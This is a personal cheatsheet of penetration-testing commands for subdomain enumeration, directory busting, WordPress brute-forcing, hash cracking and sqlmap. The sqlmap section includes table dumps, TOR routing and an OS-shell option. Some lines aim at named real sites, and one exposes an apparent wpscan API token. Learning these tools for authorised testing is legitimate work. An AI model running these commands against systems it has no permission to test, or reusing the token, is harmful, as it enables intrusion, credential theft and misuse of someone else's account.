# private_manual
this repository has collection of commands that are useful  in IT

______________________________________________________
## Docker Cheatsheet
Pull Container 
```
docker pull [CONTAINER_NAME]
```
See All Containers
`docker ps --al`l

Delete all Stoped Containers 🥵️ 
`docker container prune`

Run Containers
```docker run -it [IMAGE]```
`docker run -it centos`
`docker run -it alpine`

Stop Docker Container
`docker stop centos`

List Downloaded Images
`docker images`
______________________________________________________
## puredns

Buteforce Subdomains 
`puredns bruteforce {subdomains-wordlist.txt} domain.com resolve {resolvers.txt}`

---------

rooter_subdomain_wordlist link → https://drive.google.com/file/d/16KLYFTijq0Lemq4ZhibGl1leeN0AXjhA/view
rooter_resolvers.txt link → https://github.com/PentesterAhmed/Subdomain_BruteForce_Wordlist/blob/main/resolvers.txt

______________________________________________________
## Gobuster
Command to find directories and common files with extensions
`gobuster dir -u http://10.10.30.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,css,js,py,cgi,txt,sh`
 
Find Subdomains 
`gobuster vhost -w /media/kali/Ex-Disk/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u https://reddit.com --append-domain reddit.com`

______________________________________________________
## httpX
`cat {urls.txt} | httpx-toolkit -status-code -content-length -title -method -ip`

______________________________________________________
## Forexbuster
`feroxbuster -u trip.com`

______________________________________________________
## Dirsearch 
`dirsearch --url https://demo.vipps.no/ --deep-recursive --crawl --full-url --exclude-status 404 -w /media/kali/Ex-Disk/Wordlists/custom/quick_hits`

______________________________________________________
## GAU (Get All ULRs)
`echo “https://example.com” | gau`

______________________________________________________
## WP-SCAN
Scan URL with wpscan
wpscan --url https://onfido.com --api-token lfvsvfBTUZqWTdSepFhM22qyI5z588SxYKfKvjZt3e3

to bruteforce username and password on WP  Login
wpscan --url http://example.com/ -U user.txt -P /media/kali/Ex-Disk/Wordlists/SecLists/Passwords/2020-200_most_used_passwords.txt

______________________________________________________
## Nikto 
Perform a basic Nikto scan against a target host:
`perl nikto.pl -h 192.168.0.1`

Specify the port number when performing a basic scan:
`perl nikto.pl -h 192.168.0.1 -p 443`

Scan ports and protocols with full URL syntax:
`perl nikto.pl -h https://192.168.0.1:443/`

Scan multiple ports in the same scanning session:
`perl nikto.pl -h 192.168.0.1 -p 80,88,443`

Update to the latest plugins and databases:
`perl nikto.pl -update`

______________________________________________________
## HashCat
Crack Hash 
`hashcat -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /media/kali/Ex-Disk/Wordlists/rockyou.txt`

______________________________________________________
## hakrawler
to crawl the webpage and get the urls of that page
`echo https://example.com |  hakrawler`

______________________________________________________
## subfinder 
basic command
`subfinder --silent -d domain.com  -o output.txt`

To update subfinder tool
`sudo subfinder -update`

______________________________________________________
## findoamin 
Basic Command
`findomain -t example.com --quite > output.txt`

______________________________________________________
## sublist3r
download from here  → https://github.com/aboul3la/Sublist3r.git

Command
`./sublist3r.py -d example.com -o output.txt`

run from anywhere
`sublist3r --domain trip.com -o output.txt`

______________________________________________________
## assetfinder 
Simple Command
`assetfinder --subs-only google.com`

______________________________________________________
## knockpy
Basic Command
`knockpy domain.com`

______________________________________________________
## nslookup
Retrive TXT Records of Domain
`nslookup --type=TXT website.thm`

______________________________________________________
## waymore
Basic Scan
`python3 waymore.py -i target.com`

______________________________________________________
## SQL Map 

Run sqlmap against a single target URL:
`python sqlmap.py -u "http://www.target.com/vuln.php?id=1"`

Send data in a POST request (`--data` implies POST request):
`python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1"`
      
Change the parameter delimiter (& is the default):
`python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";"`

Select a random `User-Agent` from `./txt/user-agents.txt` and use it:
`python sqlmap.py -u "http://www.target.com/vuln.php" --random-agent`

Provide user credentials for HTTP protocol authentication:
`python sqlmap.py -u "http://www.target.com/vuln.php" --auth-type Basic --auth-cred "testuser:testpass"`


Simple usage
`sqlmap -u “http://target_server/”`

Specify target DBMS to MySQL
`sqlmap -u “http://target_server/” --dbms=mysql`

Using a proxy
`sqlmap -u “http://target_server/” --proxy=http://proxy_address:port`

Specify param1 to exploit
`sqlmap -u “http://target_server/param1=value1&param2=value2” -p param1`

Use POST requests
`sqlmap -u “http://target_server” --data=param1=value1&param2=value2`

Access with authenticated session
`sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 cookie=’my_cookie_value’`

Basic authentication
`sqlmap  -u “http://target_server” -s-data=param1=value1&param2=value2 -p  param1--auth-type=basic --auth-cred=username:password`

Evaluating response strings
`sqlmap -u “http://target_server/” --string=”This string if query is TRUE”`
`sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE”`

List databases
`sqlmap -u “http://target_server/” --dbs`

List tables of database target_DB
`sqlmap -u “http://target_server/” -D target_DB --tables`

Dump table target_Table of database target_DB
`sqlmap -u “http://target_server/” -D target_DB -T target_Table -dump`

List columns of table target_Table of database target_DB
`sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns`

Scan through TOR
`sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5`

Get OS Shell
`sqlmap -u “http://target_server/” --os-shell`

______________________________________________________
## 

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##

______________________________________________________
##
